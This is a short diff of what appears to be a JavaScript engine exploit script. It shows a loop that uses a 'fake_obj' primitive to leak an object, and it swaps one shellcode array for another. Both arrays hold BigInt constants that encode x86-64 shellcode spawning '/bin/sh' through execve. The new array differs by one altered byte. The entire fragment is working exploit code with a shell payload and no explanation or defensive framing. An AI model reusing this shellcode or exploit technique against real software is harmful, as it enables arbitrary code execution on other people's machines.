@@ -95,9 +95,16 @@ for(idx=0;idx<10000;idx++)
 	leak_str=fake_obj(2+(idx%2),BigInt(0x40000000));
 }
 
-var shellcode = [
+/*var shellcode = [
     0x2fbb485299583b6an,
     0x530068732f6e6962n,
+    0xd23148f631485f54n,
+    0x050f3bc08366n
+];*/
+
+var shellcode = [
+    0x2fbb485299583b6an,
+    0x530000732f6e6962n,
     0xd23148f631485f54n,
     0x050f3bc08366n
 ];
